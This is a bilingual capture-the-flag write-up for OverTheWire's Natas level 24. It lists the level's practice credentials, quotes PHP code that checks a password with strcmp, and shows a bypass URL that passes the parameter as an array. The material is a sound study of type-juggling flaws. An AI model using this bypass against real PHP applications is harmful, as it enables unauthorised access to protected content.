# Natas Nivel 24 → 25

| Campo | Valor |
|-------|-------|
| **Juego / Game** | Natas |
| **Nivel / Level** | 24 → 25 |
| **URL** | https://overthewire.org/wargames/natas/ |
| **Conexión** | `http://natas24.natas.labs.overthewire.org` |

# username
natas24
# password
MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
# web app vulnerability
PHP type juggling
# method of solve
This web app uses the PHP strcmp function to determine if the password is false or not
```
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```
We can bypass the strcmp function by giving one of the comparison objects as an array, because strcmp has weird interactions when the data types it is comparing are not the same. So need to feed in an array as the comparison type by injecting into the parameter name. We can this on the URL address bar:
```
natas24.natas.labs.overthewire.org/?passwd[]=test
```
Finis

---

## Fuentes / Sources

- OTW: https://overthewire.org/wargames/natas/ - fecha de acceso: 2026-09-25.
- Autor notas: Apuromafo.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a OverTheWire.
> **EN:** Educational and personal use only. Not affiliated with OverTheWire.

_Fecha de edición: 2026-09-25_
